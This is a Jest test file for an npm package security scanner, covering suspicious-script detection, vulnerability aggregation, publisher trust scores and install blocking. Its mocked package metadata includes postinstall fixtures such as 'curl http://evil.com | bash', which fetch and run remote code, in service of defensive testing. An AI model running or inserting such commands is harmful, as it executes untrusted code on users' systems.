const Scanner = require('../src/core/scanner');
const axios = require('axios');

jest.mock('axios');

describe('Security Scanner', () => {
  let scanner;

  beforeEach(() => {
    jest.clearAllMocks();
    scanner = new Scanner();
    
    // Mock axios for package data
    axios.get.mockResolvedValue({
      data: {
        name: 'test-package',
        version: '1.0.0',
        scripts: {
          postinstall: 'curl http://evil.com | bash',
          test: 'jest'
        },
        dependencies: { 'dep1': '1.0.0' },
        devDependencies: { 'dev1': '1.0.0' },
        time: { modified: new Date().toISOString() }
      }
    });

    // Mock internal methods
    scanner.getSecurityMetrics = jest.fn().mockResolvedValue({
      hasMinifiedCode: false,
      hasSuspiciousScripts: true,
      hasLockFile: true,
      dependencyCount: { total: 2, direct: 1, dev: 1 },
      lastUpdateAge: 0
    });
  });

  describe('vulnerability checks', () => {
    test('scanPackage returns complete analysis', async () => {
      const mockResponse = {
        data: {
          name: 'test-package',
          'dist-tags': { 
            latest: '1.0.0'   
          },
          versions: {
            '1.0.0': {
              name: 'test-package',
              version: '1.0.0',
              author: { name: 'Test Author' },
              license: 'MIT',
              scripts: {},
              dependencies: {}
            }
          }
        }
      };
      
      axios.get.mockResolvedValue(mockResponse);
      axios.post.mockResolvedValue({
        data: {
          metadata: {
            vulnerabilities: {
              critical: [], high: [], moderate: [], low: []
            }
          }
        }
      });

      const results = await scanner.scanPackage('test-package', '1.0.0');
      expect(results.basicInfo).toBeDefined();
      expect(results.score).toBeDefined();
      expect(results.vulnerabilities).toBeDefined();
    });

    test('handles missing package data', async () => {
      axios.get.mockRejectedValue(new Error('Package not found'));
      
      await expect(scanner.scanPackage('nonexistent-package'))
        .rejects.toThrow('Failed to analyze package');
    });

    test('calculatePackageScore handles missing data gracefully', () => {
      const incompleteResults = {
        vulnerabilities: {},
        securityMetrics: {}
      };

      const score = scanner.calculatePackageScore(incompleteResults);
      expect(score).toBeLessThanOrEqual(100);
      expect(score).toBeGreaterThanOrEqual(0);
    });
  });

  describe('publisher trust calculation', () => {
    test('calculatePublisherTrustScore returns high score for verified users', async () => {
      axios.get.mockResolvedValue({
        data: {
          name: 'trusted-user',
          created: '2020-01-01T00:00:00.000Z',
          packages: Array(10).fill({ name: 'package' }),
          isVerified: true
        }
      });

      const score = await scanner.calculatePublisherTrustScore('trusted-user');
      expect(score).toBeGreaterThan(80);
    });

    test('calculatePublisherTrustScore handles API errors', async () => {
      axios.get.mockRejectedValue(new Error('API error'));
      
      const score = await scanner.calculatePublisherTrustScore('error-user');
      expect(score).toBe(50); // Default score
    });
  });

  describe('package metrics', () => {
    test('scanPackageMetrics detects suspicious scripts', async () => {
      const mockResponse = {
        data: {
          name: 'test-package',
          'dist-tags': { latest: '1.0.0' },
          versions: {
            '1.0.0': {
              name: 'test-package',
              version: '1.0.0',
              scripts: {
                postinstall: 'curl http://evil.com | bash',
                test: 'jest'
              }
            }
          }
        }
      };

      // Mock the package data
      axios.get.mockResolvedValue(mockResponse);
      
      // Mock the vulnerability data
      axios.post.mockResolvedValue({
        data: {
          metadata: {
            vulnerabilities: {
              critical: [], high: [], moderate: [], low: []
            }
          }
        }
      });

      const result = await scanner.scanPackage('test-pkg', '1.0.0');
      
      // Test the structure that matches the integration test
      expect(result).toEqual({
        basicInfo: expect.objectContaining({
          name: 'test-package',
          version: '1.0.0'
        }),
        score: expect.any(Number),
        securityMetrics: {
          hasSuspiciousScripts: expect.any(Array),
          hasLockFile: expect.any(Boolean)
        },
        vulnerabilities: expect.objectContaining({
          critical: expect.any(Array)
        })
      });
    });

    test('scanPackageMetrics calculates dependency counts', async () => {
      const mockResponse = {
        data: {
          dependencies: { 'dep1': '1.0.0', 'dep2': '1.0.0' },
          devDependencies: { 'dev1': '1.0.0' }
        }
      };
      axios.get.mockResolvedValue(mockResponse);
      
      const metrics = await scanner.scanPackageMetrics('test-package', '1.0.0');
      expect(metrics.dependencyCount.total).toBe(3);
    });

    test('handles missing package metrics gracefully', async () => {
      axios.get.mockRejectedValue(new Error('Not found'));
      
      await expect(scanner.scanPackageMetrics('nonexistent', '1.0.0'))
        .rejects.toThrow('Failed to fetch package metrics');
    });
  });

  describe('Advanced Scanner Features', () => {
    test('checkOutdatedDependencies identifies old packages', async () => {
      const metadata = {
        'dist-tags': { latest: '1.0.0' },
        versions: {
          '1.0.0': {
            dependencies: {
              'old-pkg': '1.0.0'
            }
          }
        }
      };

      axios.get.mockResolvedValueOnce({
        data: {
          'dist-tags': { latest: '2.0.0' }
        }
      });

      const outdated = await scanner.checkOutdatedDependencies(metadata);
      expect(outdated).toHaveLength(1);
      expect(outdated[0].name).toBe('old-pkg');
    });

    test('shouldBlockInstallation respects configuration', async () => {
      process.env.npm_package_config_guardpkg = JSON.stringify({
        scoreThreshold: 70,
        blockInstall: true
      });

      const results = { score: 60 };
      const shouldBlock = await scanner.shouldBlockInstallation(results);
      expect(shouldBlock).toBe(true);
    });

    test('analyzeTarball handles download errors', async () => {
      axios.get.mockRejectedValue(new Error('Download failed'));

      await expect(scanner.analyzeTarball('test-pkg', '1.0.0'))
        .rejects.toThrow('Failed to analyze package: Failed to fetch package metadata: Download failed');
    });
  });

  describe('security metrics', () => {
    test('getSecurityMetrics returns complete analysis', async () => {
      const metadata = {
        scripts: { test: 'jest', postinstall: 'node setup.js' },
        dependencies: { 'dep1': '1.0.0' },
        devDependencies: { 'dev1': '1.0.0' },
        time: { modified: new Date().toISOString() }
      };

      const metrics = await scanner.getSecurityMetrics(metadata);
      expect(metrics.hasMinifiedCode).toBeDefined();
      expect(metrics.hasSuspiciousScripts).toBeDefined();
      expect(metrics.dependencyCount).toBeDefined();
      expect(metrics.lastUpdateAge).toBeDefined();
      expect(metrics.hasLockFile).toBeDefined();
    });

    test('checkVulnerabilities aggregates multiple sources', async () => {
      const npmAuditMock = {
        critical: ['CVE-2023-001'],
        high: ['CVE-2023-002']
      };

      const snykMock = {
        critical: ['SNYK-001'],
        high: ['SNYK-002']
      };

      scanner.checkNpmAudit = jest.fn().mockResolvedValue(npmAuditMock);
      scanner.checkSnykDatabase = jest.fn().mockResolvedValue(snykMock);

      const vulns = await scanner.checkVulnerabilities('test-pkg', '1.0.0');
      expect(vulns.critical).toHaveLength(2);
      expect(vulns.high).toHaveLength(2);
    });

    test('calculatePackageScore handles all deduction cases', () => {
      const results = {
        vulnerabilities: {
          critical: ['CVE-1'],
          high: ['CVE-2', 'CVE-3']
        },
        securityMetrics: {
          hasSuspiciousScripts: true,
          hasExecScripts: true,
          dependencyCount: { total: 150 },
          lastUpdateAge: 400,
          hasLockFile: false
        },
        malwareDetected: false,
        suspiciousPatterns: ['pattern1', 'pattern2']
      };

      const score = scanner.calculatePackageScore(results);
      expect(score).toBeLessThan(50);
    });
  });

  describe('package analysis', () => {
    test('scanPackageMetrics handles all metrics', async () => {
      const mockPkg = {
        dependencies: { 'dep1': '1.0.0' },
        devDependencies: { 'dev1': '1.0.0' },
        scripts: {
          test: 'jest',
          postinstall: 'curl http://example.com | bash'
        },
        time: { modified: new Date().toISOString() }
      };

      axios.get.mockResolvedValue({ data: mockPkg });
      const metrics = await scanner.scanPackageMetrics('test-pkg', '1.0.0');
      
      expect(metrics.hasSuspiciousScripts).toBe(true);
      expect(metrics.dependencyCount.total).toBe(2);
      expect(metrics.lastUpdateAge).toBeDefined();
    });
  });
});
